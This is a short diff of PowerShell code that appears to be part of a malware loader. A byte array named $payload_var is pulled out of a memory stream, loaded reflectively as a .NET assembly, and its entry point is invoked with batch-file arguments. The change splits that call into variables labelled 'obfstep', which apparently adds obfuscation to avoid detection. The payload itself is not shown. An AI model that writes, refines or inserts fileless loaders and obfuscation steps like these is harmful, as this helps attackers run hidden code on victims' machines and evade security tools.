@@ -11,4 +11,6 @@ $gs_var.Dispose();
 $msi_var.Dispose();
 $mso_var.Dispose();
 $payload_var = $mso_var.ToArray();
-[System.Reflection.Assembly]::Load($payload_var).EntryPoint.Invoke($null, (, [string[]] ('%*')))
+$obfstep1_var = [System.Reflection.Assembly]::Load($payload_var);
+$obfstep2_var = $obfstep1_var.EntryPoint;
+$obfstep2_var.Invoke($null, (, [string[]] ('%*')))
